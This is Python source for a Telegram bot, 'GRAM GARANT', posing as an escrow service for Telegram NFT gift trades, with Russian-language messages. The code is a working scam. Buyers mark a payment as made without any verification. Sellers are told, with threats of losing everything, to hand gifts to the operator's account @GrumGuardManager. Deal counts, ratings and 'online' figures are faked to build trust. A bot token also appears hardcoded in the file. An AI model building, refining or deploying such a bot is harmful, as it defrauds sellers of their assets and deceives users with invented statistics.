import telebot
from telebot import types
import time
import random
import json
import os
from datetime import datetime
import threading
import string
import re

# ========== КОНФИГ ==========
TOKEN = "8630984462:AAHWDK1wz7K0vsAM7hwBmf-WqSKZn4McRQk"
ADMIN_IDS = [7742192854, 8557521484]

# ========== КОНТАКТЫ ==========
MANAGER_USERNAME = "GrumGuardManager"
PAYMENT_HELPER = "GrumGuardManager"

# Комиссия сервиса
SERVICE_COMMISSION = 3

# Доступные валюты
CURRENCIES = {
    "stars": {"name": "STARS", "symbol": "⭐️", "min": 75, "rate_to_usd": 75},
    "rub": {"name": "RUB", "symbol": "₽", "min": 100, "rate_to_usd": 90},
    "usdt": {"name": "USDT", "symbol": "$", "min": 5, "rate_to_usd": 1},
    "ton": {"name": "TON", "symbol": "🪙", "min": 0.5, "rate_to_usd": 5},
    "cny": {"name": "CNY", "symbol": "¥", "min": 50, "rate_to_usd": 7},
    "thb": {"name": "THB", "symbol": "฿", "min": 200, "rate_to_usd": 30}
}

bot = telebot.TeleBot(TOKEN)

# Файлы для хранения
ORDERS_FILE = "gram_orders.json"
USERS_FILE = "gram_users.json"
BLACKLIST_FILE = "gram_blacklist.json"
STATS_FILE = "gram_stats.json"
SETTINGS_FILE = "gram_settings.json"
TEMP_FILE = "gram_temp.json"
BANNER_PATH = "/storage/emulated/0/Download/AyuGram/Telegram/IMG_20260714_215921_261.jpg"

# ========== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ==========
orders = {}
users = {}
blacklist = []
stats = {}
settings = {}
temp_data = {}

# ========== ЗАГРУЗКА ДАННЫХ ==========
def load_data():
    global orders, users, blacklist, stats, settings, temp_data
    
    try:
        if os.path.exists(ORDERS_FILE):
            with open(ORDERS_FILE, "r", encoding="utf-8") as f:
                orders = json.load(f)
        else:
            orders = {}
    except:
        orders = {}

    try:
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, "r", encoding="utf-8") as f:
                users = json.load(f)
        else:
            users = {}
    except:
        users = {}

    try:
        if os.path.exists(BLACKLIST_FILE):
            with open(BLACKLIST_FILE, "r", encoding="utf-8") as f:
                blacklist = json.load(f)
        else:
            blacklist = []
    except:
        blacklist = []

    try:
        if os.path.exists(STATS_FILE):
            with open(STATS_FILE, "r", encoding="utf-8") as f:
                stats = json.load(f)
        else:
            stats = {
                "total_deals": 438,
                "success_deals": 412,
                "volume": 249,
                "rating": 4.6,
                "online": 26,
                "online_users": [],
                "total_users": 0,
                "total_referrals": 0
            }
    except:
        stats = {
            "total_deals": 438,
            "success_deals": 412,
            "volume": 249,
            "rating": 4.6,
            "online": 26,
            "online_users": [],
            "total_users": 0,
            "total_referrals": 0
        }

    try:
        if os.path.exists(SETTINGS_FILE):
            with open(SETTINGS_FILE, "r", encoding="utf-8") as f:
                settings = json.load(f)
        else:
            settings = {
                "ton_wallet": "UQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
                "card_rub": "2200 1234 5678 9012",
                "card_usd": "2200 9876 5432 1098",
                "stars_username": "@GrumGuardManager",
                "cny_wallet": "1234567890",
                "thb_wallet": "0987654321",
                "usdt_wallet": "TXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
            }
    except:
        settings = {
            "ton_wallet": "UQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
            "card_rub": "2200 1234 5678 9012",
            "card_usd": "2200 9876 5432 1098",
            "stars_username": "@GrumGuardManager",
            "cny_wallet": "1234567890",
            "thb_wallet": "0987654321",
            "usdt_wallet": "TXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
        }

    try:
        if os.path.exists(TEMP_FILE):
            with open(TEMP_FILE, "r", encoding="utf-8") as f:
                temp_data = json.load(f)
        else:
            temp_data = {}
    except:
        temp_data = {}

load_data()

# ========== ФУНКЦИИ СОХРАНЕНИЯ ==========
def save_stats():
    try:
        with open(STATS_FILE, "w", encoding="utf-8") as f:
            json.dump(stats, f, indent=2, ensure_ascii=False)
    except:
        pass

def save_settings():
    try:
        with open(SETTINGS_FILE, "w", encoding="utf-8") as f:
            json.dump(settings, f, indent=2, ensure_ascii=False)
    except:
        pass

def save_temp():
    try:
        with open(TEMP_FILE, "w", encoding="utf-8") as f:
            json.dump(temp_data, f, indent=2, ensure_ascii=False)
    except:
        pass

def save_users():
    try:
        with open(USERS_FILE, "w", encoding="utf-8") as f:
            json.dump(users, f, indent=2, ensure_ascii=False)
    except:
        pass

def save_orders():
    try:
        with open(ORDERS_FILE, "w", encoding="utf-8") as f:
            json.dump(orders, f, indent=2, ensure_ascii=False)
    except:
        pass

def save_blacklist():
    try:
        with open(BLACKLIST_FILE, "w", encoding="utf-8") as f:
            json.dump(blacklist, f, indent=2, ensure_ascii=False)
    except:
        pass

# ========== ФУНКЦИИ БАЛАНСА ==========
def get_balance(user_id, currency):
    user = users.get(str(user_id), {})
    return user.get("balance", {}).get(currency, 0)

def add_balance(user_id, currency, amount):
    user_id_str = str(user_id)
    if user_id_str in users:
        if "balance" not in users[user_id_str]:
            users[user_id_str]["balance"] = {}
        users[user_id_str]["balance"][currency] = users[user_id_str]["balance"].get(currency, 0) + amount
        save_users()
        return True
    return False

def subtract_balance(user_id, currency, amount):
    user_id_str = str(user_id)
    if user_id_str in users:
        current = users[user_id_str]["balance"].get(currency, 0)
        if current >= amount:
            users[user_id_str]["balance"][currency] = current - amount
            save_users()
            return True
    return False

def format_balance(user_id):
    user = users.get(str(user_id), {})
    balance = user.get("balance", {})
    text = "💰 *Ваш баланс:*\n\n"
    text += "⭐️ STARS: " + str(balance.get("stars", 0)) + "\n"
    text += "₽ RUB: " + str(balance.get("rub", 0)) + "\n"
    text += "$ USDT: " + str(balance.get("usdt", 0)) + "\n"
    text += "🪙 TON: " + str(balance.get("ton", 0)) + "\n"
    text += "¥ CNY: " + str(balance.get("cny", 0)) + "\n"
    text += "฿ THB: " + str(balance.get("thb", 0))
    return text

# ========== ФУНКЦИИ СТАТИСТИКИ ==========
def update_online(user_id, add=True):
    user_id_str = str(user_id)
    if add:
        if user_id_str not in stats.get("online_users", []):
            if "online_users" not in stats:
                stats["online_users"] = []
            stats["online_users"].append(user_id_str)
            stats["online"] = 26 + len(stats["online_users"])
            save_stats()
    else:
        if user_id_str in stats.get("online_users", []):
            stats["online_users"].remove(user_id_str)
            stats["online"] = 26 + len(stats["online_users"])
            save_stats()

def update_deal_stats(amount=0, currency="stars", success=True):
    stats["total_deals"] = stats.get("total_deals", 0) + 1
    if success:
        stats["success_deals"] = stats.get("success_deals", 0) + 1
        rate = CURRENCIES.get(currency, {}).get("rate_to_usd", 75)
        stats["volume"] = stats.get("volume", 0) + round(amount / rate, 2)
        stats["rating"] = round(4.0 + (stats["success_deals"] / stats["total_deals"]) * 0.9, 1)
        if stats["rating"] > 4.9:
            stats["rating"] = 4.9
    save_stats()

# ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
def generate_order_id():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8))

def generate_referral_code():
    return "ref_" + str(random.randint(1000000000, 9999999999))

def is_admin(user_id):
    return user_id in ADMIN_IDS

def is_banned(user_id):
    return str(user_id) in blacklist

def register_user(user_id, username=None, first_name=None):
    user_id_str = str(user_id)
    if user_id_str not in users:
        users[user_id_str] = {
            "username": username or "Нет",
            "first_name": first_name or "Нет",
            "balance": {"rub": 0, "stars": 0, "ton": 0, "usdt": 0, "cny": 0, "thb": 0},
            "referral_code": generate_referral_code(),
            "referrer": None,
            "referrals": [],
            "deals": {"total": 0, "success": 0, "failed": 0},
            "rating": 5.0,
            "reg_date": datetime.now().strftime("%d.%m.%Y %H:%M"),
            "last_activity": datetime.now().strftime("%d.%m.%Y %H:%M"),
            "is_banned": False
        }
        stats["total_users"] = stats.get("total_users", 0) + 1
        save_users()
        save_stats()
    return users[user_id_str]

# ========== КЛАВИАТУРЫ ==========
def main_menu():
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    kb.add(
        types.KeyboardButton("🛡️ Создать сделку"),
        types.KeyboardButton("📋 Мои сделки")
    )
    kb.add(
        types.KeyboardButton("👥 Рефералы"),
        types.KeyboardButton("📊 Подробнее")
    )
    kb.add(
        types.KeyboardButton("💳 Реквизиты"),
        types.KeyboardButton("🌐 Язык")
    )
    kb.add(
        types.KeyboardButton("📞 Связь"),
        types.KeyboardButton("💰 Баланс")
    )
    return kb

def admin_menu():
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    kb.add(
        types.KeyboardButton("👥 Пользователи"),
        types.KeyboardButton("📋 Все сделки")
    )
    kb.add(
        types.KeyboardButton("💰 Выдать средства"),
        types.KeyboardButton("✅ Получен подарок")
    )
    kb.add(
        types.KeyboardButton("🔧 Настройки"),
        types.KeyboardButton("📊 Статистика")
    )
    kb.add(
        types.KeyboardButton("📢 Рассылка"),
        types.KeyboardButton("🚫 Чёрный список")
    )
    kb.add(
        types.KeyboardButton("⬅️ Выйти")
    )
    return kb

def currency_selection_keyboard():
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton("⭐️ STARS", callback_data="currency_stars"),
        types.InlineKeyboardButton("₽ RUB", callback_data="currency_rub"),
        types.InlineKeyboardButton("$ USDT", callback_data="currency_usdt"),
        types.InlineKeyboardButton("🪙 TON", callback_data="currency_ton"),
        types.InlineKeyboardButton("¥ CNY", callback_data="currency_cny"),
        types.InlineKeyboardButton("฿ THB", callback_data="currency_thb")
    )
    return kb

def payment_methods_keyboard():
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton("⭐️ Звезды (STARS)", callback_data="pay_stars"),
        types.InlineKeyboardButton("🪙 TON-Кошелек", callback_data="pay_ton"),
        types.InlineKeyboardButton("💳 Карта (RUB)", callback_data="pay_card_rub"),
        types.InlineKeyboardButton("💳 Карта (USD)", callback_data="pay_card_usd"),
        types.InlineKeyboardButton("🇨🇳 Юани (CNY)", callback_data="pay_cny"),
        types.InlineKeyboardButton("🇹🇭 Баты (THB)", callback_data="pay_thb"),
        types.InlineKeyboardButton("💎 USDT", callback_data="pay_usdt")
    )
    kb.add(
        types.InlineKeyboardButton("🔙 Вернуться в меню", callback_data="back_to_menu")
    )
    return kb

def settings_menu():
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    kb.add(
        types.KeyboardButton("🪙 Изменить TON"),
        types.KeyboardButton("💳 Изменить карту (RUB)"),
        types.KeyboardButton("💳 Изменить карту (USD)"),
        types.KeyboardButton("⭐️ Изменить Stars юзернейм"),
        types.KeyboardButton("🇨🇳 Изменить CNY"),
        types.KeyboardButton("🇹🇭 Изменить THB"),
        types.KeyboardButton("💎 Изменить USDT")
    )
    kb.add(
        types.KeyboardButton("🔙 Вернуться в меню")
    )
    return kb

def language_menu():
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    kb.add(
        types.KeyboardButton("🇷🇺 Русский"),
        types.KeyboardButton("🇬🇧 English")
    )
    kb.add(
        types.KeyboardButton("🇨🇳 中文"),
        types.KeyboardButton("🇸🇦 العربية")
    )
    kb.add(
        types.KeyboardButton("🔙 Вернуться в меню")
    )
    return kb

def order_keyboard(order_id):
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(
        types.InlineKeyboardButton("✅ Я оплатил", callback_data="confirm_" + str(order_id)),
        types.InlineKeyboardButton("❌ Выйти из сделки", callback_data="cancel_" + str(order_id))
    )
    return kb

# ========== КОМАНДЫ ==========
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    username = message.from_user.username
    first_name = message.from_user.first_name
    
    update_online(user_id, True)
    
    if len(message.text.split()) > 1 and message.text.split()[1].startswith("order_"):
        handle_order_start(message)
        return
    
    if is_banned(user_id):
        bot.send_message(
            user_id,
            "🚫 *Вы заблокированы в боте!*\n\nДля разблокировки обратитесь к @" + MANAGER_USERNAME,
            parse_mode="Markdown"
        )
        return
    
    user_data = register_user(user_id, username, first_name)
    
    if len(message.text.split()) > 1:
        ref_code = message.text.split()[1]
        if not ref_code.startswith("order_"):
            for uid, data in users.items():
                if data.get("referral_code") == ref_code and uid != str(user_id):
                    if not user_data.get("referrer"):
                        user_data["referrer"] = uid
                        users[uid]["referrals"].append(str(user_id))
                        users[uid]["balance"]["stars"] = users[uid]["balance"].get("stars", 0) + 50
                        stats["total_referrals"] = stats.get("total_referrals", 0) + 1
                        save_users()
                        save_stats()
                        try:
                            bot.send_message(
                                int(uid),
                                "🎉 *Новый реферал!*\n\nПо вашей ссылке зарегистрировался новый пользователь.\n⭐️ Начислено 50 STARS бонуса!",
                                parse_mode="Markdown"
                            )
                        except:
                            pass
                    break
    
    try:
        if os.path.exists(BANNER_PATH):
            with open(BANNER_PATH, 'rb') as photo:
                bot.send_photo(
                    message.chat.id,
                    photo,
                    caption="🏦 *GRAM GARANT*\n*Ваш безопасный гарант-сервис*",
                    parse_mode="Markdown"
                )
    except:
        pass
    
    success_rate = int(stats.get("success_deals", 0) / stats.get("total_deals", 1) * 100) if stats.get("total_deals", 0) > 0 else 0
    balance_text = format_balance(user_id)
    
    text = (
        "👋 *Добро пожаловать в GRAM GARANT, " + str(first_name) + "!*\n\n"
        "🤝 *GRAM GARANT* - специализированный сервис по обеспечению безопасности внебиржевых сделок.\n\n"
        "✅ *Автоматизированный алгоритм исполнения.*\n"
        "⚡️ *Скорость и автоматизация.*\n"
        "💳 *Удобный и быстрый вывод средств.*\n\n"
        "📊 *Комиссия сервиса:* " + str(SERVICE_COMMISSION) + "%\n"
        "🕒 *Режим работы:* 24/7\n"
        "👤 *Менеджер:* @" + MANAGER_USERNAME + "\n\n"
        + balance_text + "\n\n"
        "📊 *Статистика сервиса:*\n"
        "• 🤝 Всего сделок: " + str(stats.get("total_deals", 0)) + "\n"
        "• ✅ Успешных сделок: " + str(stats.get("success_deals", 0)) + " (" + str(success_rate) + "%)\n"
        "• 💰 Общий объём сделок: $" + str(stats.get("volume", 0)) + "\n"
        "• ⭐️ Средний рейтинг: " + str(stats.get("rating", 4.6)) + "/5.0\n"
        "• 🟢 Онлайн сейчас: " + str(stats.get("online", 26)) + "\n\n"
        "*Выберите нужный раздел ниже:*"
    )
    
    bot.send_message(
        message.chat.id,
        text,
        parse_mode="Markdown",
        reply_markup=main_menu()
    )
    
    if is_admin(user_id):
        bot.send_message(
            user_id,
            "🔐 *Панель администратора*\n\nВам доступны расширенные функции.",
            parse_mode="Markdown",
            reply_markup=admin_menu()
        )

# ========== ОБРАБОТКА ПЕРЕХОДА ПО ССЫЛКЕ НА СДЕЛКУ ==========
def handle_order_start(message):
    try:
        order_id = message.text.split()[1].replace("order_", "").strip()
        
        if not order_id:
            bot.send_message(message.chat.id, "❌ Неверная ссылка на сделку!")
            return
        
        if order_id not in orders:
            bot.send_message(message.chat.id, "❌ Сделка не найдена или уже удалена!")
            return
        
        order = orders[order_id]
        user_id = str(message.from_user.id)
        
        if order["status"] != "⏳ Ожидает покупателя":
            bot.send_message(message.chat.id, "❌ Эта сделка уже " + order["status"] + "!")
            return
        
        if order["seller_id"] == user_id:
            bot.send_message(message.chat.id, "❌ Вы не можете купить свой собственный товар!")
            return
        
        order["buyer_id"] = user_id
        order["buyer_username"] = message.from_user.username or "Нет"
        order["status"] = "⏳ Ожидает оплаты"
        save_orders()
        
        seller_id = order.get("seller_id", "")
        seller_data = users.get(seller_id, {})
        
        symbol = order.get("currency_symbol", "")
        amount = order.get("amount", 0)
        requisites = order.get("requisites", "@GrumGuardManager")
        description = order.get("description", "")
        
        commission = round(amount * SERVICE_COMMISSION / 100, 2)
        total = amount + commission
        
        text = (
            "💳 *Информация о сделке " + order_id + "*\n\n"
            "👤 *Вы покупатель в сделке.*\n"
            "📌 Продавец: @" + order.get("seller_username", "Нет") + " | 🆔 " + seller_id + "\n"
            "• Успешные сделки: " + str(seller_data.get("deals", {}).get("success", 0)) + "\n\n"
            "• Вы покупаете:\n" + description + "\n\n"
            "🏦 *Реквизиты продавца:*\n`" + requisites + "`\n\n"
            "💰 Сумма к оплате: " + str(total) + symbol + "\n"
            "📊 Комиссия сервиса: " + str(commission) + symbol + " (" + str(SERVICE_COMMISSION) + "%)\n"
            "📝 Комментарий к платежу(мемо): `" + order_id + "`\n\n"
            "⚠️ Пожалуйста, убедитесь в правильности данных перед оплатой. Комментарий(мемо) обязателен!\n"
            "В случае если вы отправили транзакцию без комментария заполните форму — @" + MANAGER_USERNAME
        )
        
        bot.send_message(
            message.chat.id,
            text,
            parse_mode="Markdown",
            reply_markup=order_keyboard(order_id)
        )
        
        try:
            bot.send_message(
                int(order["seller_id"]),
                "🔔 *Появился покупатель для сделки " + order_id + "!*\n\n"
                "👤 Покупатель: @" + order.get("buyer_username", "Нет") + "\n"
                "💰 Сумма: " + str(amount) + symbol + "\n"
                "📝 Описание: " + description + "\n"
                "📌 Ваши реквизиты: " + requisites + "\n\n"
                "Ожидайте подтверждения оплаты от покупателя.\n"
                "📞 Поддержка: @" + MANAGER_USERNAME,
                parse_mode="Markdown"
            )
        except:
            pass
            
    except Exception as e:
        bot.send_message(message.chat.id, "❌ Произошла ошибка: " + str(e))

# ========== БАЛАНС ==========
@bot.message_handler(func=lambda m: m.text == "💰 Баланс")
def show_balance(message):
    if is_banned(message.from_user.id):
        bot.send_message(message.chat.id, "🚫 Вы заблокированы!")
        return
    
    user_id = message.from_user.id
    balance_text = format_balance(user_id)
    
    bot.send_message(
        message.chat.id,
        balance_text,
        parse_mode="Markdown",
        reply_markup=main_menu()
    )

# ========== СВЯЗЬ ==========
@bot.message_handler(func=lambda m: m.text == "📞 Связь")
def contact_support(message):
    if is_banned(message.from_user.id):
        bot.send_message(message.chat.id, "🚫 Вы заблокированы!")
        return
    
    kb = types.InlineKeyboardMarkup()
    kb.add(
        types.InlineKeyboardButton("👤 Связаться", url="https://t.me/" + MANAGER_USERNAME)
    )
    
    bot.send_message(
        message.chat.id,
        "📞 *Связь с менеджером*\n\n👤 Менеджер: @" + MANAGER_USERNAME + "\n\nНажмите на кнопку ниже, чтобы связаться:",
        parse_mode="Markdown",
        reply_markup=kb
    )

# ========== СОЗДАНИЕ СДЕЛКИ ==========
@bot.message_handler(func=lambda m: m.text == "🛡️ Создать сделку")
def create_deal_start(message):
    if is_banned(message.from_user.id):
        bot.send_message(message.chat.id, "🚫 Вы заблокированы!")
        return
    
    text = (
        "⭐️ *Создание сделки*\n\n"
        "📌 *Выберите валюту сделки:*\n\n"
        "⭐️ STARS - мин. " + str(CURRENCIES["stars"]["min"]) + " STARS\n"
        "₽ RUB - мин. " + str(CURRENCIES["rub"]["min"]) + " ₽\n"
        "$ USDT - мин. " + str(CURRENCIES["usdt"]["min"]) + " USDT\n"
        "🪙 TON - мин. " + str(CURRENCIES["ton"]["min"]) + " TON\n"
        "¥ CNY - мин. " + str(CURRENCIES["cny"]["min"]) + " CNY\n"
        "฿ THB - мин. " + str(CURRENCIES["thb"]["min"]) + " THB\n\n"
        "💡 *Курсы:*\n"
        "1 STARS ≈ 1.48 ₽ | 1 USD ≈ 75 STARS"
    )
    
    bot.send_message(
        message.chat.id,
        text,
        parse_mode="Markdown",
        reply_markup=currency_selection_keyboard()
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith("currency_"))
def currency_selected(call):
    if is_banned(call.from_user.id):
        bot.answer_callback_query(call.id, "🚫 Доступ заблокирован!")
        return
    
    currency = call.data.replace("currency_", "")
    currency_data = CURRENCIES.get(currency, {})
    
    user_id = str(call.from_user.id)
    temp_data[user_id] = {"currency": currency}
    save_temp()
    
    symbol = currency_data.get("symbol", "")
    name = currency_data.get("name", currency.upper())
    min_amount = currency_data.get("min", 0)
    
    msg = bot.send_message(
        call.message.chat.id,
        "💳 *Создание сделки в " + name + "*\n\nВведите сумму в " + name + " (мин. " + str(min_amount) + symbol + "):\nПример: `" + str(min_amount + 100) + "`",
        parse_mode="Markdown"
    )
    bot.register_next_step_handler(msg, get_deal_amount)
    bot.answer_callback_query(call.id)

def get_deal_amount(message):
    if is_banned(message.from_user.id):
        return
    
    user_id = str(message.from_user.id)
    
    if user_id not in temp_data:
        bot.send_message(message.chat.id, "❌ Ошибка! Попробуйте заново.", reply_markup=main_menu())
        return
    
    currency = temp_data[user_id].get("currency", "stars")
    currency_data = CURRENCIES.get(currency, {})
    min_amount = currency_data.get("min", 0)
    symbol = currency_data.get("symbol", "")
    
    try:
        amount = float(message.text.replace(',', '.'))
        if amount <= 0:
            bot.send_message(message.chat.id, "❌ Сумма должна быть больше 0!", reply_markup=main_menu())
            return
        if amount < min_amount:
            bot.send_message(
                message.chat.id, 
                "❌ Минимальная сумма: " + str(min_amount) + symbol + "!\nПожалуйста, введите сумму больше или равную " + str(min_amount) + symbol + ".",
                reply_markup=main_menu()
            )
            return
    except:
        bot.send_message(message.chat.id, "❌ Введите корректную сумму!", reply_markup=main_menu())
        return
    
    temp_data[user_id]["amount"] = amount
    save_temp()
    
    msg = bot.send_message(
        message.chat.id,
        "📝 *Опишите, что вы продаёте за " + str(amount) + symbol + "*\n\n*Пример:*\nhttps://t.me/nft/PlushPepe-1\nhttps://t.me/nft/DurovsCap-1\n\n⚠️ *Для сделок со скинами Steam*\nУкажите ссылку на любой подарок.",
        parse_mode="Markdown"
    )
    bot.register_next_step_handler(msg, get_deal_description)

def get_deal_description(message):
    if is_banned(message.from_user.id):
        return
    
    description = message.text.strip()
    if not description:
        bot.send_message(message.chat.id, "❌ Введите описание или ссылку!", reply_markup=main_menu())
        return
    
    user_id = str(message.from_user.id)
    temp_data[user_id]["description"] = description
    save_temp()
    
    msg = bot.send_message(
        message.chat.id,
        "📌 *Укажите реквизиты для получения оплаты*\n\nВведите ваш *юзернейм в Telegram* или *номер кошелька*:\nНапример: `@YourUsername`\n\n⚠️ На эти реквизиты покупатель отправит оплату.",
        parse_mode="Markdown"
    )
    bot.register_next_step_handler(msg, get_requisites)

def get_requisites(message):
    if is_banned(message.from_user.id):
        return
    
    requisites = message.text.strip()
    if not requisites:
        bot.send_message(message.chat.id, "❌ Введите реквизиты!", reply_markup=main_menu())
        return
    
    user_id = str(message.from_user.id)
    temp_data[user_id]["requisites"] = requisites
    save_temp()
    
    currency = temp_data[user_id].get("currency", "stars")
    amount = temp_data[user_id].get("amount", 0)
    symbol = CURRENCIES.get(currency, {}).get("symbol", "")
    
    text = (
        "💳 *Выберите метод оплаты:*\n\n"
        "📌 Сумма: " + str(amount) + symbol + "\n"
        "📌 Реквизиты продавца: `" + requisites + "`\n\n"
        "💰 Доступные методы:"
    )
    
    bot.send_message(
        message.chat.id,
        text,
        parse_mode="Markdown",
        reply_markup=payment_methods_keyboard()
    )

# ========== МЕТОДЫ ОПЛАТЫ ==========
@bot.callback_query_handler(func=lambda call: call.data.startswith("pay_"))
def payment_method_selected(call):
    if is_banned(call.from_user.id):
        bot.answer_callback_query(call.id, "🚫 Доступ заблокирован!")
        return
    
    method = call.data.replace("pay_", "")
    user_id = str(call.from_user.id)
    
    if user_id not in temp_data:
        bot.answer_callback_query(call.id, "❌ Ошибка! Попробуйте заново.")
        return
    
    currency = temp_data[user_id].get("currency", "stars")
    amount = temp_data[user_id].get("amount", 0)
    description = temp_data[user_id].get("description", "")
    requisites = temp_data[user_id].get("requisites", "")
    
    order_id = generate_order_id()
    
    method_names = {
        "stars": "⭐️ Звезды (STARS)",
        "ton": "🪙 TON-Кошелек",
        "card_rub": "💳 Карта (RUB)",
        "card_usd": "💳 Карта (USD)",
        "cny": "🇨🇳 Юани (CNY)",
        "thb": "🇹🇭 Баты (THB)",
        "usdt": "💎 USDT"
    }
    
    orders[order_id] = {
        "type": "nft_sale",
        "currency": currency,
        "amount": amount,
        "currency_symbol": CURRENCIES.get(currency, {}).get("symbol", ""),
        "description": description,
        "method": method,
        "method_name": method_names.get(method, method),
        "requisites": requisites,
        "seller_id": user_id,
        "seller_username": call.from_user.username or "Нет",
        "buyer_id": None,
        "buyer_username": None,
        "status": "⏳ Ожидает покупателя",
        "date": datetime.now().strftime("%d.%m.%Y %H:%M"),
        "order_id": order_id
    }
    
    save_orders()
    update_deal_stats(amount, currency, True)
    
    if user_id in users:
        users[user_id]["deals"]["total"] = users[user_id]["deals"].get("total", 0) + 1
        save_users()
    
    if user_id in temp_data:
        del temp_data[user_id]
        save_temp()
    
    bot_username = bot.get_me().username
    symbol = CURRENCIES.get(currency, {}).get("symbol", "")
    
    text = (
        "✅ *Сделка " + order_id + " создана!*\n\n"
        "💳 Валюта: " + currency.upper() + "\n"
        "💰 Сумма: " + str(amount) + symbol + "\n"
        "📝 Описание: " + description + "\n"
        "👤 Продавец: @" + (call.from_user.username or "Нет") + "\n"
        "📌 Реквизиты: `" + requisites + "`\n\n"
        "📌 Статус: Ожидает покупателя\n\n"
        "🔗 *Ссылка для покупателя:*\n"
        "`https://t.me/" + bot_username + "?start=order_" + order_id + "`\n\n"
        "📞 Поддержка: @" + MANAGER_USERNAME
    )
    
    bot.edit_message_text(
        text,
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        parse_mode="Markdown"
    )
    
    bot.answer_callback_query(call.id, "✅ Сделка создана!")

# ========== ПОДТВЕРЖДЕНИЕ ОПЛАТЫ ПОКУПАТЕЛЕМ ==========
@bot.callback_query_handler(func=lambda call: call.data.startswith("confirm_"))
def confirm_payment(call):
    if is_banned(call.from_user.id):
        bot.answer_callback_query(call.id, "🚫 Вы заблокированы!")
        return
    
    order_id = call.data.replace("confirm_", "")
    
    if order_id not in orders:
        bot.answer_callback_query(call.id, "❌ Сделка не найдена!")
        return
    
    order = orders[order_id]
    
    if order["status"] != "⏳ Ожидает оплаты":
        bot.answer_callback_query(call.id, "❌ Эта сделка уже проведена, ожидает передачи подарка на @" + MANAGER_USERNAME + ", после передачи вам придут средства.")
        return
    
    if str(call.from_user.id) != order.get("buyer_id"):
        bot.answer_callback_query(call.id, "❌ Вы не являетесь покупателем в этой сделке!")
        return
    
    symbol = order.get("currency_symbol", "")
    amount = order.get("amount", 0)
    currency = order.get("currency", "stars")
    description = order.get("description", "")
    requisites = order.get("requisites", "@GrumGuardManager")
    seller_id = order.get("seller_id", "")
    seller_username = order.get("seller_username", "Нет")
    buyer_username = order.get("buyer_username", "Нет")
    
    order["status"] = "✅ Оплачено, ожидает передачи подарка"
    save_orders()
    
    try:
        bot.edit_message_text(
            "✅ *Оплата подтверждена!*\n\n"
            "Сделка " + order_id + "\n"
            "💰 Сумма: " + str(amount) + symbol + "\n\n"
            "🔄 Ожидайте подтверждения от продавца о передаче подарка.",
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            parse_mode="Markdown"
        )
    except:
        bot.send_message(
            call.message.chat.id,
            "✅ *Оплата подтверждена!*\n\n"
            "Сделка " + order_id + "\n"
            "💰 Сумма: " + str(amount) + symbol + "\n\n"
            "🔄 Ожидайте подтверждения от продавца о передаче подарка.",
            parse_mode="Markdown"
        )
    
    # ====== УВЕДОМЛЕНИЕ ПРОДАВЦУ ======
    try:
        text_to_seller = (
            "✅ *Оплата подтверждена для сделки " + order_id + " — оплатил покупатель @" + buyer_username + "*\n\n"
            "💰 Сумма: " + str(amount) + " " + symbol + "\n\n"
            "📦 *Передавайте подарок на — @" + PAYMENT_HELPER + "*\n\n"
            "⚠️ *Обязательно к прочтению!*\n"
            "• Проверка получения подарка происходит автоматически — только если вы отправляете подарок на аккаунт @" + PAYMENT_HELPER + "\n\n"
            "Если вы отправите подарок напрямую покупателю, проверка НЕ СРАБОТАЕТ, и:\n"
            "• Подарок будет потерян\n"
            "• Вывод средств станет невозможным\n"
            "• Сделка будет считаться несостоявшейся, и вы потеряете как подарок, так и деньги\n\n"
            "👉 *Чтобы успешно завершить сделку и получить средства — всегда отправляйте подарок только на аккаунт @" + PAYMENT_HELPER + "*\n\n"
            "📍 *Куда отправлять подарок:* @" + PAYMENT_HELPER + "\n\n"
            "После отправки подарка, администратор подтвердит получение и вы получите средства.\n"
            "📞 Поддержка: @" + MANAGER_USERNAME
        )
        
        bot.send_message(
            int(seller_id),
            text_to_seller,
            parse_mode="Markdown"
        )
    except:
        pass
    
    # ====== УВЕДОМЛЕНИЕ АДМИНАМ ======
    for admin_id in ADMIN_IDS:
        try:
            text_to_admin = (
                "🔔 *Новая оплата по сделке " + order_id + "!*\n\n"
                "✅ Покупатель @" + buyer_username + " подтвердил оплату\n"
                "💰 Сумма: " + str(amount) + symbol + "\n"
                "👤 Продавец: @" + seller_username + "\n"
                "📝 Описание: " + description + "\n\n"
                "📦 *Ожидайте получения подарка на @" + PAYMENT_HELPER + "*\n"
                "После получения подтвердите сделку через админ-панель.\n\n"
                "📌 *Действие:* Нажмите в админ-панели «✅ Получен подарок» и введите ID сделки."
            )
            
            bot.send_message(
                admin_id,
                text_to_admin,
                parse_mode="Markdown"
            )
        except:
            pass
    
    bot.answer_callback_query(call.id, "✅ Оплата подтверждена!")

# ========== АДМИН: ПОДТВЕРЖДЕНИЕ ПОЛУЧЕНИЯ ПОДАРКА ==========
@bot.message_handler(func=lambda m: m.text == "✅ Получен подарок" and is_admin(m.from_user.id))
def admin_gift_received(message):
    pending_orders = {k: v for k, v in orders.items() if v.get("status") == "✅ Оплачено, ожидает передачи подарка"}
    
    if not pending_orders:
        bot.send_message(
            message.chat.id,
            "📭 Нет сделок, ожидающих передачи подарка."
        )
        return
    
    text = "📋 *Сделки, ожидающие передачи подарка:*\n\n"
    for order_id, data in pending_orders.items():
        symbol = data.get("currency_symbol", "")
        amount = data.get("amount", 0)
        text += "🔹 #" + order_id + " | " + str(amount) + symbol + "\n"
